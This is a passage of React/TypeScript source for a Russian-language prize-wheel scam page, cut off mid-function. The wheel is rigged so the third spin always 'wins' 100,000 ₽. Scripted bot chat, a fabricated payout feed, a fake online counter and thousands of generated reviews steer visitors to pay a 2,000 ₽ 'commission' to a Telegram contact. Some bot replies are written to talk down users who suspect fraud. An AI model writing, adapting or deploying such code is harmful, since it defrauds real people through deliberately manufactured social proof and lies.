import { useState, useEffect, useRef, useCallback } from 'react';
import Icon from '@/components/ui/icon';

const MANAGER_URL = 'https://t.me/Ekaterinamoneys';
const COMMISSION = 2000;
const PRIZE = 100000;
const STORAGE_KEY = 'wb_roulette_state';

// ─── Данные для ленты выплат ───────────────────────────────────────────────
const RND_NAMES = ['Алексей М.','Марина К.','Дмитрий В.','Ольга С.','Игорь П.','Светлана Р.',
  'Никита Т.','Елена Ф.','Артём Б.','Кристина Л.','Роман Д.','Анастасия Ж.',
  'Владимир Г.','Татьяна Н.','Максим О.','Юлия В.','Павел Н.','Валерия С.',
  'Денис Х.','Евгения Б.','Андрей Ф.','Наталья К.','Виктор Р.','Карина О.',
  'Тимур А.','Полина Г.','Вадим Ш.','Ирина Д.','Константин М.','Ксения П.',
  'Леонид Т.','Диана У.','Руслан С.','Вероника Н.','Степан К.','Алёна Ж.'];
const RND_CITIES = ['Москва','Казань','СПб','Новосибирск','Екатеринбург','Сочи','Самара',
  'Уфа','Пермь','Ростов','Воронеж','Тюмень','Краснодар','Челябинск','Омск',
  'Красноярск','Саратов','Нижний Новгород','Ярославль','Иркутск','Хабаровск',
  'Владивосток','Тула','Рязань','Брянск','Курск','Орёл','Липецк'];
const RND_SUMS = ['100 000 ₽','100 000 ₽','100 000 ₽','100 000 ₽','1 000 ₽','500 ₽','300 ₽','100 000 ₽','1 000 ₽','100 000 ₽'];
const rnd = <T,>(a: T[]): T => a[Math.floor(Math.random() * a.length)];
const rndInt = (min: number, max: number) => Math.floor(Math.random() * (max - min + 1)) + min;

// ─── Колесо ───────────────────────────────────────────────────────────────
const SECTORS = [
  { label: '0 ₽',       color: '#1e1e22' },
  { label: '500 ₽',     color: '#7B2FF7' },
  { label: '0 ₽',       color: '#1e1e22' },
  { label: '1 000 ₽',   color: '#A020F0' },
  { label: '0 ₽',       color: '#1e1e22' },
  { label: '100 000 ₽', color: '#FF1FB3' },
  { label: '0 ₽',       color: '#1e1e22' },
  { label: '300 ₽',     color: '#7B2FF7' },
];

// ─── Боты чата ────────────────────────────────────────────────────────────
const BOTS = [
  { name: 'Наташа',   avatar: 'Н', color: '#FF1FB3', f: true  },
  { name: 'Дима',     avatar: 'Д', color: '#7B2FF7', f: false },
  { name: 'Алина',    avatar: 'А', color: '#A020F0', f: true  },
  { name: 'Серёга',   avatar: 'С', color: '#6366f1', f: false },
  { name: 'Оля',      avatar: 'О', color: '#ec4899', f: true  },
  { name: 'Макс',     avatar: 'М', color: '#8b5cf6', f: false },
  { name: 'Лена',     avatar: 'Л', color: '#f472b6', f: true  },
  { name: 'Антон',    avatar: 'А', color: '#818cf8', f: false },
  { name: 'Кристина', avatar: 'К', color: '#c084fc', f: true  },
  { name: 'Влад',     avatar: 'В', color: '#a78bfa', f: false },
  { name: 'Таня',     avatar: 'Т', color: '#f9a8d4', f: true  },
  { name: 'Паша',     avatar: 'П', color: '#7c3aed', f: false },
  { name: 'Женя',     avatar: 'Ж', color: '#db2777', f: true  },
  { name: 'Коля',     avatar: 'К', color: '#4f46e5', f: false },
  { name: 'Вика',     avatar: 'В', color: '#be185d', f: true  },
  { name: 'Рома',     avatar: 'Р', color: '#5b21b6', f: false },
];

// Выбор согласованной формы слова по полу бота
const g = (botIdx: number, fem: string, masc: string) =>
  BOTS[botIdx % BOTS.length].f ? fem : masc;

type ChatMsg = { bot: number; text: string; time: string; id: number };
const nowTime = () => { const d = new Date(); return `${String(d.getHours()).padStart(2,'0')}:${String(d.getMinutes()).padStart(2,'0')}`; };

// ─── Огромная база реплик ─────────────────────────────────────────────────
// Диалоговые пары: [вопрос, ответ(ы)]
const DIALOGUES: Array<{ q: { bot: number; text: string }; a: Array<{ bot: number; text: string }> }> = [
  {
    q: { bot: 1, text: 'народ, у кого-нибудь уже получилось вывести деньги??' },
    a: [
      { bot: 0, text: 'да! я вывела вчера, всё пришло на карту 💜' },
      { bot: 5, text: 'я тоже, часа через 2 после оплаты комиссии' },
      { bot: 3, text: 'и я! Екатерина очень помогла разобраться' },
    ],
  },
  {
    q: { bot: 2, text: 'а сколько ждать после того как написал менеджеру?' },
    a: [
      { bot: 0, text: 'мне пришло через полтора часа, быстро совсем' },
      { bot: 4, text: 'у меня было 2 часа, зависит от банка наверное' },
    ],
  },
  {
    q: { bot: 7, text: 'ребят, это вообще безопасно? первый раз тут' },
    a: [
      { bot: 0, text: 'абсолютно! я тоже боялась сначала, но всё честно' },
      { bot: 1, text: 'я уже второй раз участвую, в прошлый раз тоже вывел' },
      { bot: 5, text: 'да всё ок, подруга посоветовала и не пожалела' },
    ],
  },
  {
    q: { bot: 3, text: 'блин первые две попытки ноль 😭 это нормально?' },
    a: [
      { bot: 0, text: 'у всех так!! третья попытка — главная, жди' },
      { bot: 4, text: 'у меня тоже так было, а потом 100 тысяч 🎉' },
      { bot: 2, text: 'да это специально так сделано, чтоб интересней было)' },
    ],
  },
  {
    q: { bot: 5, text: 'а на какую карту можно вывести?' },
    a: [
      { bot: 0, text: 'я на сбер выводила, всё нормально пришло' },
      { bot: 6, text: 'я на тинькофф, тоже без проблем' },
      { bot: 1, text: 'Екатерина сказала любая карта подходит' },
    ],
  },
  {
    q: { bot: 8, text: 'какая комиссия за вывод?' },
    a: [
      { bot: 0, text: '2000 рублей. это налог, потом возвращается с выплатой' },
      { bot: 3, text: 'ну да, 2к — это ничто по сравнению с 100 тысячами)' },
    ],
  },
  {
    q: { bot: 6, text: 'Екатерина быстро отвечает в телеграм?' },
    a: [
      { bot: 0, text: 'мне ответила буквально за 3 минуты' },
      { bot: 5, text: 'да очень быстро, даже ночью отвечает кажется 😄' },
      { bot: 2, text: 'я писала вечером — ответ пришёл сразу' },
    ],
  },
  {
    q: { bot: 9, text: 'ааааа третья попытка — 100 000 рублей!!!! 🎉🎉🎉' },
    a: [
      { bot: 0, text: 'ПОЗДРАВЛЯЮ!! 🔥🔥🔥 скорее пиши Екатерине!' },
      { bot: 4, text: 'ура!! ещё один победитель, так держать!' },
      { bot: 2, text: 'вот это везение!! пиши быстрее менеджеру пока акция идёт' },
      { bot: 6, text: 'ааа завидую белой завистью 😍 поздравляю!!' },
    ],
  },
  {
    q: { bot: 10, text: 'написала Екатерине, говорит деньги придут в течение дня' },
    a: [
      { bot: 1, text: 'отлично! у меня тоже так говорила, и правда пришло' },
      { bot: 5, text: 'жди жди, всё будет 💜' },
    ],
  },
  {
    q: { bot: 11, text: 'а почему налог надо платить до получения, а не после?' },
    a: [
      { bot: 0, text: 'это банковское требование, стандартная процедура' },
      { bot: 3, text: 'да так у всех розыгрышей работает, не переживай' },
      { bot: 7, text: 'я тоже спрашивала, Екатерина объяснила — это просто верификация' },
    ],
  },
  {
    q: { bot: 12, text: 'сегодня утром перевод пришёл!! спасибо всем кто советовал 🥹' },
    a: [
      { bot: 0, text: 'ура!!! так рада за тебя! на что потратишь??' },
      { bot: 4, text: 'поздравляю!! 🎉 теперь советуй другим)' },
      { bot: 6, text: 'вот это новости!! кайф, теперь я тоже хочу попробовать' },
    ],
  },
  {
    q: { bot: 13, text: 'блин у меня вторая попытка — 1000 рублей выпало!' },
    a: [
      { bot: 2, text: 'уже приятно)) третья будет главной!' },
      { bot: 5, text: 'это хороший знак, жди третью крутку 🍀' },
    ],
  },
  {
    q: { bot: 14, text: 'как долго уже работает этот розыгрыш?' },
    a: [
      { bot: 0, text: 'я уже год слежу, всегда платили честно' },
      { bot: 3, text: 'давно, я второй раз участвую — первый раз тоже вывела' },
    ],
  },
  {
    q: { bot: 15, text: 'народ, а можно не платить комиссию и всё равно получить?' },
    a: [
      { bot: 0, text: 'нет, это обязательная верификация счёта' },
      { bot: 1, text: 'без этого банк просто не проведёт платёж' },
      { bot: 3, text: 'да не жадись, 2к — это мелочь ради 100 тысяч 😄' },
    ],
  },
  {
    q: { bot: 4, text: 'привет всем! только зашла, что тут за акция?' },
    a: [
      { bot: 0, text: 'привет! розыгрыш 100 000 рублей, крути колесо, 3 попытки' },
      { bot: 1, text: 'третья попытка гарантированно выигрышная, пробуй!' },
      { bot: 5, text: 'добро пожаловать 😊 я уже вывела на прошлой неделе' },
    ],
  },
  {
    q: { bot: 6, text: 'у меня 500 рублей на первой попытке выпало)' },
    a: [
      { bot: 2, text: 'хороший старт! ещё две попытки, главная впереди' },
      { bot: 9, text: 'у меня тоже так было, а потом 100к 😏' },
    ],
  },
  {
    q: { bot: 7, text: 'деньги ПРИШЛИ!!! я так орала что соседи испугались 😂' },
    a: [
      { bot: 0, text: 'АХАХАХА поздравляю! я понимаю это чувство 😂🎉' },
      { bot: 4, text: 'вот это реакция 😂 поздравляю от души!' },
      { bot: 6, text: 'хахаха идёт крутить колесо с надеждой тоже поорать 😄' },
    ],
  },
  {
    q: { bot: 8, text: 'ребят скиньте ссылку на менеджера ещё раз?' },
    a: [
      { bot: 0, text: '@Ekaterinamoneys в телеграме, очень быстро отвечает' },
      { bot: 3, text: 'да, Екатерина — она всё объяснит и поможет оформить' },
    ],
  },
  {
    q: { bot: 9, text: 'интересно, а здесь много людей уже выиграло сегодня?' },
    a: [
      { bot: 5, text: 'судя по ленте — постоянно кто-то выводит' },
      { bot: 0, text: 'да у нас тут чуть ли не каждые 5 минут кто-то выигрывает 😄' },
    ],
  },
  {
    q: { bot: 10, text: 'оплатила комиссию, жду перевод. волнуюсь немного 😅' },
    a: [
      { bot: 0, text: 'не волнуйся, всё придёт! я тоже так нервничала, а потом пришло 😊' },
      { bot: 4, text: 'жди спокойно, Екатерина надёжная, не подведёт' },
      { bot: 1, text: 'всё будет хорошо! пиши потом как придёт 🎉' },
    ],
  },
  {
    q: { bot: 11, text: 'а если написать менеджеру поздно ночью, ответит?' },
    a: [
      { bot: 0, text: 'я писала в 2 ночи — ответила быстро 😄' },
      { bot: 6, text: 'да она всегда на связи, реально 24/7' },
    ],
  },
  {
    q: { bot: 12, text: 'подруге посоветовала, она тоже выиграла 100к!! 🥰' },
    a: [
      { bot: 0, text: 'вы обе везучие! завидую хорошей завистью 😄' },
      { bot: 4, text: 'вот это семья 😂 поздравляю вас обеих!' },
    ],
  },
  {
    q: { bot: 13, text: 'хм, а налог точно возвращается?' },
    a: [
      { bot: 0, text: 'да, у меня вернулось вместе с выигрышем в одном переводе' },
      { bot: 3, text: 'Екатерина объяснила что это включается в сумму выплаты' },
    ],
  },
  {
    q: { bot: 14, text: 'только что выиграл 300 рублей на первой попытке 😁' },
    a: [
      { bot: 5, text: 'уже что-то! главная попытка — третья, жди её' },
      { bot: 2, text: 'хороший задел! осталось две попытки' },
    ],
  },
  {
    q: { bot: 15, text: 'а что если я уже крутил сегодня? можно ещё раз?' },
    a: [
      { bot: 0, text: 'попытки сохраняются, просто продолжай с того места где остановился' },
      { bot: 1, text: 'да, всё сохраняется. просто дожди третьей попытки' },
    ],
  },
];

// Одиночные реплики для наполнения (без ответа)
const SOLO_MSGS: Array<{ bot: number; text: string }> = [
  { bot: 0,  text: 'всем привет! настроение отличное сегодня 😊' },
  { bot: 1,  text: 'ребят, удачи всем на третьей попытке! 🍀' },
  { bot: 2,  text: 'только что оплатила комиссию, жду перевод' },
  { bot: 3,  text: 'уже трачу свои 100к 😄 купила себе телефон новый' },
  { bot: 4,  text: 'Екатерина — просто огонь, всё объяснила за 5 минут' },
  { bot: 5,  text: 'советую всем знакомым, реально честный розыгрыш' },
  { bot: 6,  text: 'третья попытка это просто волшебство 🎰' },
  { bot: 7,  text: 'а я уже второй раз участвую, в прошлый раз тоже вывела' },
  { bot: 8,  text: 'слушайте ну это топ акция, такого нигде нет' },
  { bot: 9,  text: 'скоро напишу как пришли деньги, жду часик' },
  { bot: 10, text: 'подруга звонила, говорит тоже выиграла 🥰' },
  { bot: 11, text: 'главное не тянуть с комиссией, а то акция закончится' },
  { bot: 12, text: 'пришло!! 💜💜💜 не верю своему счастью!' },
  { bot: 13, text: 'удачи всем! я уже на пути за покупками 😄' },
  { bot: 14, text: 'кто ещё не пробовал — пробуйте, стоит!' },
  { bot: 15, text: 'третья попытка не подводит, проверено 💯' },
  { bot: 0,  text: 'написала менеджеру, жду ответа' },
  { bot: 1,  text: 'очередь из победителей 😄 нас тут много' },
  { bot: 2,  text: 'кстати деньги пришли прямо в день обращения!' },
  { bot: 3,  text: 'ну и розыгрыш, реально сделан для людей' },
  { bot: 4,  text: 'уже трижды советовала, все получили деньги' },
  { bot: 5,  text: 'ждите третьей попытки, она ваша 🎯' },
  { bot: 6,  text: 'эх, потратила на маникюр часть выигрыша 💅' },
  { bot: 7,  text: 'два часа ждала и деньги пришли! ура!' },
  { bot: 8,  text: 'лучший день за последнее время 🎉' },
];

// ─── Умные ответы ботов на сообщения пользователя ────────────────────────
// Ключевые темы → массив ответов (функций для подстановки пола)
type ReplyFn = (b: number) => string;

const SMART_REPLIES: Array<{ keys: string[]; replies: ReplyFn[] }> = [
  {
    keys: ['привет','здравствуй','хай','добрый','ку','здорово'],
    replies: [
      b => `привет! ${g(b,'рада видеть','рад видеть')} тебя здесь 😊`,
      b => `здарова! ${g(b,'заходи','заходи')}, тут как раз весело)`,
      b => `привет привет! мы уже ${g(b,'крутанула','крутанул')} колесо, ты следующий 😄`,
      b => `о, новенький! давай крути, не пожалеешь`,
    ],
  },
  {
    keys: ['вывод','вывести','вывела','получить деньги','как вывести','деньги'],
    replies: [
      b => `я ${g(b,'выводила','выводил')} через менеджера @Ekaterinamoneys, всё пришло за 2 часа`,
      b => `пиши Екатерине в телеграм, она всё объяснит. я так ${g(b,'сделала','сделал')} и не пожалела`,
      b => `у меня ${g(b,'ушло','ушло')} полтора часа после оплаты. просто жди, всё придёт 👍`,
      b => `${g(b,'писала','писал')} менеджеру, ответила за 3 минуты. сейчас жду перевод`,
    ],
  },
  {
    keys: ['комиссия','налог','платить','2000','оплата','заплатить'],
    replies: [
      b => `да, 2000 рублей. я ${g(b,'боялась','боялся')} сначала, но это стандартная банковская процедура`,
      b => `это не потеря, это верификация счёта. ${g(b,'оплатила','оплатил')} и получила 100к сверху`,
      b => `2к — это ничто по сравнению с 100 тысячами. я ${g(b,'не сомневалась','не сомневался')} ни секунды`,
      b => `без этого банк не проведёт платёж, таков порядок. ${g(b,'сама удивилась','сам удивился')} но всё честно`,
    ],
  },
  {
    keys: ['попытка','кручу','крутить','колесо','spin','вращать'],
    replies: [
      b => `у меня первые две тоже ноль ${g(b,'были','были')}, третья — БИНГО! не сдавайся`,
      b => `третья попытка главная, у ${g(b,'меня так и было','меня так и было')} 🍀`,
      b => `крути! я ${g(b,'крутила','крутил')} вчера, с третьей выпало 100к 🎰`,
      b => `жди третью попытку. она решающая, проверено на себе 😊`,
    ],
  },
  {
    keys: ['обман','развод','мошенники','не верю','правда','серьёзно','реально'],
    replies: [
      b => `я ${g(b,'сама не верила','сам не верил')} пока деньги не пришли на карту 😅`,
      b => `${g(b,'понимаю тебя','понимаю тебя')}, я тоже думала что развод. оказалось честно!`,
      b => `${g(b,'верила','верил')} с трудом, но подруга уговорила. деньги реальные пришли`,
      b => `смотри ленту выводов — там постоянно кто-то получает. это не случайно 😄`,
    ],
  },
  {
    keys: ['сколько ждать','долго','когда придут','когда получу','сроки'],
    replies: [
      b => `мне ${g(b,'пришло','пришло')} за 1.5 часа после оплаты. зависит от банка немного`,
      b => `${g(b,'ждала','ждал')} 2 часа, потом пришло. не нервничай, всё будет`,
      b => `Екатерина ${g(b,'сказала','сказал')} мне что до конца дня, но пришло быстрее`,
      b => `в среднем 1-3 часа. я ${g(b,'сидела','сидел')} и обновляла приложение банка 😄`,
    ],
  },
  {
    keys: ['менеджер','екатерина','телеграм','написать','связаться'],
    replies: [
      b => `@Ekaterinamoneys — она очень ${g(b,'вежливая','вежливый')}, я ${g(b,'осталась','остался')} довольна`,
      b => `пиши в телеграм, я ${g(b,'написала','написал')} в 11 вечера — ответила за 5 минут`,
      b => `Екатерина всегда на связи. ${g(b,'написала','написал')} ей сразу как выиграла, помогла оформить всё`,
      b => `она реально быстро отвечает. я ${g(b,'боялась','боялся')} что долго, но нет 😊`,
    ],
  },
  {
    keys: ['карта','сбер','тинькофф','банк','счёт','перевод'],
    replies: [
      b => `я ${g(b,'выводила','выводил')} на сбер — всё пришло нормально`,
      b => `у меня тинькофф, тоже без проблем. ${g(b,'получила','получил')} вчера`,
      b => `любая карта подходит, Екатерина ${g(b,'сказала мне','сказал мне')}. главное чтоб была активная`,
      b => `на сбер, втб, тинькофф — всё работает. я ${g(b,'проверила','проверил')} на себе 😄`,
    ],
  },
  {
    keys: ['выиграл','выиграла','получил','получила','ура','ааа','🎉','победил'],
    replies: [
      b => `ааа ${g(b,'поздравляю','поздравляю')}!! 🎉🎉 скорее пиши Екатерине!`,
      b => `вот это да! я ${g(b,'так рада за тебя','так рад за тебя')} 🔥 не тяни с оплатой`,
      b => `УРА!! пиши менеджеру прямо сейчас пока акция идёт 💜`,
      b => `ого!! я ${g(b,'так завидую','так завидую')} хорошей завистью 😄 поздравляю!!`,
    ],
  },
  {
    keys: ['спасибо','благодарю','спс','thanks'],
    replies: [
      b => `${g(b,'пожалуйста','пожалуйста')}! удачи тебе 🍀`,
      b => `да не за что! ${g(b,'сама','сам')} через это прошла, понимаю 😊`,
      b => `всегда! главное — не тяни с третьей попыткой)`,
      b => `удачи! ${g(b,'верю','верю')} что у тебя тоже получится 💜`,
    ],
  },
  {
    keys: ['не получилось','не вышло','ноль','проиграл','расстроился'],
    replies: [
      b => `не расстраивайся! у ${g(b,'меня тоже','меня тоже')} первые две — ноль, а третья — 100к`,
      b => `${g(b,'держись','держись')}! третья попытка решающая, я в тебя верю 💜`,
      b => `у всех так! первые две для разминки, третья — деньги 🎯`,
      b => `не сдавайся. ${g(b,'сама','сам')} так думала, а потом выиграла 😄`,
    ],
  },
];

// Дефолтные ответы когда тема не распознана
const DEFAULT_REPLIES: ReplyFn[] = [
  b => `${g(b,'согласна','согласен')}! тут реально всё честно работает`,
  b => `${g(b,'написала','написал')} бы менеджеру, она поможет разобраться`,
  b => `я ${g(b,'тоже так думала','тоже так думал')} сначала 😄`,
  b => `ха, ${g(b,'понимаю тебя','понимаю тебя')}! главное — не упусти акцию`,
  b => `${g(b,'крутила','крутил')} вчера, с третьей попытки 100к. просто подожди`,
  b => `точно! у нас тут целая компания победителей 😄`,
  b => `${g(b,'поддерживаю','поддерживаю')}! всем удачи на третьей попытке 🍀`,
  b => `ага, я ${g(b,'тоже удивилась','тоже удивился')} когда деньги пришли 😅`,
];

const getSmartReplies = (userText: string): Array<{ bot: number; text: string }> => {
  const low = userText.toLowerCase();
  const matched = SMART_REPLIES.filter(s => s.keys.some(k => low.includes(k)));
  const pool = matched.length > 0
    ? matched.flatMap(m => m.replies)
    : DEFAULT_REPLIES;

  // выбираем 1-2 разных бота для ответа
  const count = rndInt(1, 2);
  const usedBots = new Set<number>();
  const result: Array<{ bot: number; text: string }> = [];
  const shuffledPool = [...pool].sort(() => Math.random() - 0.5);

  for (let i = 0; i < shuffledPool.length && result.length < count; i++) {
    const botIdx = rndInt(0, BOTS.length - 1);
    if (!usedBots.has(botIdx)) {
      usedBots.add(botIdx);
      result.push({ bot: botIdx, text: shuffledPool[i](botIdx) });
    }
  }
  return result;
};

// ─── Генератор потока сообщений с диалогами ──────────────────────────────
const buildMsgStream = (): Array<{ bot: number; text: string; delay: number }> => {
  const stream: Array<{ bot: number; text: string; delay: number }> = [];
  let t = 500;

  // перемешиваем диалоги и соло
  const shuffledDialogues = [...DIALOGUES].sort(() => Math.random() - 0.5);
  const shuffledSolo = [...SOLO_MSGS].sort(() => Math.random() - 0.5);
  let si = 0;

  shuffledDialogues.forEach((dlg) => {
    // вопрос
    stream.push({ ...dlg.q, delay: t });
    t += rndInt(2500, 5000);
    // ответы с паузами между ними
    dlg.a.forEach((ans) => {
      stream.push({ ...ans, delay: t });
      t += rndInt(1800, 3500);
    });
    // иногда вставляем соло-реплику
    if (Math.random() > 0.5 && si < shuffledSolo.length) {
      stream.push({ ...shuffledSolo[si++], delay: t });
      t += rndInt(2000, 4000);
    }
  });
  // добавим оставшиеся соло
  for (; si < shuffledSolo.length; si++) {
    stream.push({ ...shuffledSolo[si], delay: t });
    t += rndInt(2000, 4500);
  }
  return stream;
};

// ─── Генерация отзывов ────────────────────────────────────────────────────
const AVATAR_COLORS = ['#FF1FB3','#7B2FF7','#A020F0','#6366f1','#ec4899','#8b5cf6','#f472b6','#818cf8','#c084fc','#a78bfa'];

const REVIEW_NAMES = ['Анна В.','Сергей К.','Юлия М.','Павел Н.','Кристина Л.','Артём Б.',
  'Марина С.','Николай Ф.','Дарья П.','Роман Д.','Светлана О.','Игорь П.',
  'Наталья Т.','Андрей Х.','Вероника Н.','Тимур А.','Полина Г.','Вадим Ш.',
  'Ирина Д.','Константин М.','Ксения П.','Леонид Т.','Диана У.','Руслан С.',
  'Алёна Ж.','Евгений Б.','Карина О.','Денис Х.','Валерия С.','Олег Р.'];

const REVIEW_CITIES = ['Москва','Казань','СПб','Новосибирск','Екатеринбург','Сочи','Самара',
  'Уфа','Краснодар','Ростов','Воронеж','Тюмень','Омск','Красноярск','Ярославль'];

const REVIEW_TEXTS = [
  'Не верила, но реально пришли деньги! Заплатила комиссию 2000 рублей, через 2 часа всё было на карте 🙏 Спасибо огромное!',
  'Выиграл 100 000 с третьей попытки. Сначала думал развод, но менеджер Екатерина всё объяснила. Деньги пришли!',
  'Первые две попытки ноль, третья — джекпот! Оплатила налог как сказали и через час деньги на счету.',
  'Получил 100 000 рублей. Чуть подождал пока менеджер оформил, оплатил комиссию и всё пришло. Доволен на все 100!',
  'Девочки, это правда! Выиграла с 3й попытки, написала менеджеру, оплатила 2000 и ждала полтора часа. Ура!!',
  'Скептически относился к таким акциям, но рискнул. Выиграл, вывел. Комиссия небольшая — это стандартная банковская операция.',
  'Уже третья в нашей компании кто выиграл здесь! Подруга посоветовала, не пожалела. Деньги реальные.',
  'Выиграл 100к. Оплатил налог. Деньги пришли. Всё. Работает точно.',
  'Боялась мошенников, но всё оказалось честно! Менеджер Екатерина очень помогла, объяснила каждый шаг.',
  'Третья попытка — 100 000 рублей. Думал фейк, но нет. Потратил немного на комиссию и получил сумму.',
  'Давно слежу за этим розыгрышем, наконец решилась. Не пожалела!! Деньги вывела без проблем.',
  'Нормально всё. Выиграл. Вывел. Комиссия небольшая. Рекомендую не откладывать.',
  'Я в шоке в хорошем смысле! Никогда не думала что буду участвовать в таком, но подруга уговорила. ПРИШЛО!',
  'Екатерина ответила за 3 минуты, всё объяснила. Деньги были на карте уже через 1,5 часа после оплаты.',
  'Сначала муж был против, но когда увидел деньги на счету — сам стал крутить 😄 Спасибо за розыгрыш!',
  'Два часа ждала перевода, думала что-то пошло не так. Но пришло! Просто банк медленно работал.',
  'Не верила своим глазам когда 100к выпало. Написала менеджеру, оплатила 2000 и спокойно ждала.',
  'Честный розыгрыш, рекомендую. Главное сразу писать менеджеру и не затягивать с комиссией.',
  'Выиграла и сразу купила маме подарок на день рождения 🎁 Спасибо огромное!',
  'Это мой второй раз здесь. Первый раз тоже вывела. Стабильно и честно!',
];

const seededRand = (seed: number) => { let s = seed; return () => { s = (s * 9301 + 49297) % 233280; return s / 233280; }; };

const generateReviews = (count: number) => {
  const rand = seededRand(42);
  return Array.from({ length: count }, (_, i) => {
    const name = REVIEW_NAMES[Math.floor(rand() * REVIEW_NAMES.length)];
    return {
      id: i,
      name,
      initials: name[0],
      color: AVATAR_COLORS[Math.floor(rand() * AVATAR_COLORS.length)],
      city: REVIEW_CITIES[Math.floor(rand() * REVIEW_CITIES.length)],
      text: REVIEW_TEXTS[Math.floor(rand() * REVIEW_TEXTS.length)],
      stars: rand() > 0.15 ? 5 : 4,
      date: `${Math.floor(rand() * 28) + 1} ${['января','февраля','марта','апреля','мая','июня'][Math.floor(rand() * 6)]} 2025`,
      sum: rand() > 0.1 ? '100 000 ₽' : '50 000 ₽',
    };
  });
};

const ALL_REVIEWS = generateReviews(20000);
const PAGE_SIZE = 20;

// ─── Колесо ───────────────────────────────────────────────────────────────
const Wheel = ({ spinning, rotation }: { spinning: boolean; rotation: number }) => {
  const size = 280; const cx = size / 2; const r = size / 2 - 6;
  const seg = 360 / SECTORS.length;
  return (
    <div className="relative" style={{ width: size, height: size }}>
      <div className="absolute left-1/2 -top-1 z-20 -translate-x-1/2"
        style={{ width: 0, height: 0, borderLeft: '14px solid transparent', borderRight: '14px solid transparent', borderTop: '26px solid #FF1FB3' }} />
      <svg width={size} height={size} viewBox={`0 0 ${size} ${size}`}
        style={{ transform: `rotate(${rotation}deg)`, transition: spinning ? 'transform 4.5s cubic-bezier(0.16,1,0.3,1)' : 'none' }}
        className="drop-shadow-[0_0_30px_rgba(160,32,240,0.6)]">
        <circle cx={cx} cy={cx} r={r + 5} fill="#0E0E10" stroke="#A020F0" strokeWidth="3" />
        {SECTORS.map((s, i) => {
          const a0 = (i * seg - 90) * (Math.PI / 180);
          const a1 = ((i + 1) * seg - 90) * (Math.PI / 180);
          const x0 = cx + r * Math.cos(a0); const y0 = cx + r * Math.sin(a0);
          const x1 = cx + r * Math.cos(a1); const y1 = cx + r * Math.sin(a1);
          const mid = (i * seg + seg / 2 - 90) * (Math.PI / 180);
          const tx = cx + r * 0.62 * Math.cos(mid); const ty = cx + r * 0.62 * Math.sin(mid);
          return (
            <g key={i}>
              <path d={`M${cx},${cx} L${x0},${y0} A${r},${r} 0 0,1 ${x1},${y1} Z`} fill={s.color} stroke="#0E0E10" strokeWidth="2" />
              <text x={tx} y={ty} fill="#fff" fontSize="12" fontWeight="700" textAnchor="middle"
                transform={`rotate(${i * seg + seg / 2},${tx},${ty})`}>{s.label}</text>
            </g>
          );
        })}
      </svg>
      <div className="absolute left-1/2 top-1/2 z-10 flex h-14 w-14 -translate-x-1/2 -translate-y-1/2 items-center justify-center rounded-full wb-gradient text-2xl shadow-lg">🎰</div>
    </div>
  );
};

// ─── Главный компонент ────────────────────────────────────────────────────
const Index = () => {
  // Загрузка сохранённого состояния
  const saved = (() => { try { const s = localStorage.getItem(STORAGE_KEY); return s ? JSON.parse(s) : null; } catch { return null; } })();

  const [attempts, setAttempts] = useState<number>(saved?.attempts ?? 0);
  const [spinning, setSpinning] = useState(false);
  const [rotation, setRotation] = useState<number>(saved?.rotation ?? 0);
  const [balance, setBalance] = useState<number>(saved?.balance ?? 0);
  const [won, setWon] = useState<boolean>(saved?.won ?? false);
  const [resultMsg, setResultMsg] = useState('');
  const [showWithdraw, setShowWithdraw] = useState(false);
  const [history, setHistory] = useState<string[]>(saved?.history ?? []);

  const [feed, setFeed] = useState(() => Array.from({ length: 8 }, (_, i) => ({ name: RND_NAMES[i], sum: RND_SUMS[i % RND_SUMS.length], city: RND_CITIES[i], id: i })));
  const [chat, setChat] = useState<ChatMsg[]>([]);
  const [chatInput, setChatInput] = useState('');
  const [typing, setTyping] = useState<number | null>(null);
  const [onlineCount, setOnlineCount] = useState(4871);
  const [reviewPage, setReviewPage] = useState(1);
  const [reviewSearch, setReviewSearch] = useState('');

  const chatRef = useRef<HTMLDivElement>(null);
  const streamRef = useRef<Array<{ bot: number; text: string; delay: number }>>([]);
  const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const msgIdRef = useRef(0);

  // Сохранение в localStorage
  useEffect(() => {
    try { localStorage.setItem(STORAGE_KEY, JSON.stringify({ attempts, rotation, balance, won, history })); }
    catch { /* ignore */ }
  }, [attempts, rotation, balance, won, history]);

  useEffect(() => {
    if (chatRef.current) chatRef.current.scrollTop = chatRef.current.scrollHeight;
  }, [chat, typing]);

  // Лента выплат
  useEffect(() => {
    const t = setInterval(() => {
      setFeed(f => [{ name: rnd(RND_NAMES), sum: rnd(RND_SUMS), city: rnd(RND_CITIES), id: Date.now() }, ...f].slice(0, 14));
    }, 2600);
    return () => clearInterval(t);
  }, []);

  // Счётчик онлайн
  useEffect(() => {
    const t = setInterval(() => setOnlineCount(c => Math.max(4500, c + rndInt(-5, 8))), 3500);
    return () => clearInterval(t);
  }, []);

  // Бесконечный поток диалогов
  useEffect(() => {
    let cancelled = false;
    const addMsg = (msg: { bot: number; text: string }) => {
      if (cancelled) return;
      setTyping(msg.bot);
      timerRef.current = setTimeout(() => {
        if (cancelled) return;
        setTyping(null);
        setChat(c => [...c, { ...msg, time: nowTime(), id: msgIdRef.current++ }].slice(-80));
        scheduleNext();
      }, 900 + msg.text.length * 26);
    };

    let qIdx = 0;
    const scheduleNext = () => {
      if (cancelled) return;
      if (qIdx >= streamRef.current.length) {
        streamRef.current = buildMsgStream();
        qIdx = 0;
      }
      const item = streamRef.current[qIdx++];
      timerRef.current = setTimeout(() => addMsg(item), rndInt(1500, 4000));
    };

    streamRef.current = buildMsgStream();
    scheduleNext();
    return () => { cancelled = true; if (timerRef.current) clearTimeout(timerRef.current); };
  }, []);

  // Колесо
  const spin = () => {
    if (spinning || attempts >= 3 || won) return;
    const next = attempts + 1;
    const isWin = next === 3;
    const targetIndex = isWin ? 5 : next === 1 ? 0 : 2;
    const seg = 360 / SECTORS.length;
    const target = 360 * 8 + (360 - (targetIndex * seg + seg / 2));
    setSpinning(true); setResultMsg('');
    setRotation(target);
    setTimeout(() => {
      setSpinning(false); setAttempts(next);
      if (isWin) {
        setBalance(PRIZE); setWon(true);
        setResultMsg('🎉 Поздравляем! Вы выиграли 100 000 ₽!');
        setHistory(h => [`Попытка ${next}: ВЫИГРЫШ 100 000 ₽ 🏆`, ...h]);
      } else {
        setResultMsg('😔 Не повезло. Ещё попытки есть!');
        setHistory(h => [`Попытка ${next}: не повезло`, ...h]);
      }
    }, 4700);
  };

  // Чат
  const sendChat = () => {
    if (!chatInput.trim()) return;
    const text = chatInput.trim();
